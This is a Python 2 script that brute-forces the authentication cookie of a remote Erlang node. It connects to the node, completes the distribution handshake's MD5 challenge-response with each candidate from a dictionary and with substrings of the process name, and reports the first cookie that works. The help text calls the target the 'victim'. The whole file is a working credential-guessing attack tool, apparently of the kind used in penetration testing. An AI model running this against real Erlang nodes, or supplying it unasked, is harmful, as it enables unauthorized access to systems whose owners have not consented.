#!/usr/bin/env python2

from struct import pack, unpack
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from random import choice
from string import ascii_uppercase
import sys
import argparse
from time import sleep



def rand_id(n=6):
  return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

parser = argparse.ArgumentParser(description='Tests every cookie value in dictionary against victim, to successfully complete authentication.')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('process', action='store', type=str, help='Erlang process name')
parser.add_argument('dictionary', action='store', type=str, help='Dictionary of Erlang cookies to test')
parser.add_argument('--delay', type=float, default=0.0, help='Amount of seconds (float) to sleep between attempts')

def send_name(name):
  return pack('!HcHI', 7 + len(name), 'n', 5, 0x3499c) + name

def send_challenge_reply(cookie, challenge):
  m = md5()
  m.update(cookie)
  m.update(challenge)
  response = m.digest()
  return pack('!HcI', len(response)+5, 'r', 0) + response


def does_cookie_authenticate(cookie):
  name = rand_id()

  sock = socket(AF_INET, SOCK_STREAM, 0)
  assert(sock)

  sock.connect((args.target, args.port))

  sock.sendall(send_name(name))

  data = sock.recv(5)
  assert(data == '\x00\x03\x73\x6f\x6b')

  data = sock.recv(4096)
  (length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
  challenge = '%u' % challenge

  sock.sendall(send_challenge_reply(cookie, challenge))

  data = sock.recv(3)
  if len(data) == 0:
    sock.close()
    return False
  else:
    assert(data == '\x00\x11\x61')
    digest = sock.recv(16)
    assert(len(digest) == 16)
    sock.close()

    return True

args = parser.parse_args()

f = open(args.dictionary, 'rb')
cookies = [l.rstrip('\n') for l in f.readlines()]

# always try process name itself, and its substrings
def get_unique_substrings(s):
  length = len(s)
  result = set()
  for i in xrange(length):
    for j in xrange(i, length):
      if s[i:j+1] not in result:
        yield s[i:j+1]
        result.add(s[i:j+1])

for substring in get_unique_substrings(args.process):
  cookies.append(substring)

n_cookies = len(cookies)

for i in range(len(cookies)):
  cookie = cookies[i]

  sys.stdout.write('\r[{:2.2f} %] trying {:>64}'.format((100.0*i)//n_cookies, cookie))
  sys.stdout.flush()

  if does_cookie_authenticate(cookie):
    print('\n[*] found cookie %r' % cookie)
    break

  sleep(args.delay)
